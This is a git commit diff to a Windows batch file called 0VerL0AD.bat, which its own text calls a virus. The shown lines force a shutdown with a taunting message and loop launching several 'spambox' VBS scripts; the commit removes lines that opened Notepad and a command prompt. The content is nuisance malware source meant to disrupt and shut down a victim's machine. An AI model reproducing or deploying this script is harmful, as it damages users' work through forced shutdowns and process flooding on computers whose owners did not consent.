fd4f1bece044acaf5919fff08ec76693ae26cf56
MDYON <56523829+MDYON@users.noreply.github.com>
2020-01-27 17:34:42 -0800

    Update 0VerL0AD.bat

--- 0VerL0AD.bat
+++ 0VerL0AD.bat
@@ -4,8 +4,6 @@ shutdown -s -t 70 -c "Your computer has been fucked by the 0VerL0AD Virus!"
 goto b
 
 :b
- START %SystemRoot%\system32\notepad.exe
- start cmd
  start spambox.vbs
  start spambox2.vbs
  start spambox3.vbs
